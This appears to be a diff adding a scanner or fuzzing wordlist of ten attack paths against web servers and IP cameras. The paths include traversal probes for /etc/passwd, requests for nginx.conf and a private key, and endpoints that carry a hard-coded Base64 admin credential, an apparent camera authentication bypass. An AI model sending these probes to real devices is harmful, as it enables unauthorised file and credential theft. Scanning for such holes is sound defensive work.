@@ -1,0 +1,10 @@
+/adm/file.cgi?next_file=%2fetc%2fpasswd
+/../../../../../../../../../../../../../etc/passwd
+/command/prima-factory.cgi
+/../../../../../etc/passwd
+/conf/nginx.conf
+/cgi-bin/operator/fileread?READ.filePath=/etc/passwd
+/self.key
+/System/configurationFile?auth=YWRtaW46MTEK
+/onvif-http/snapshot?auth=YWRtaW46MTEK
+/CFCARD/images/SeleaCamera/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
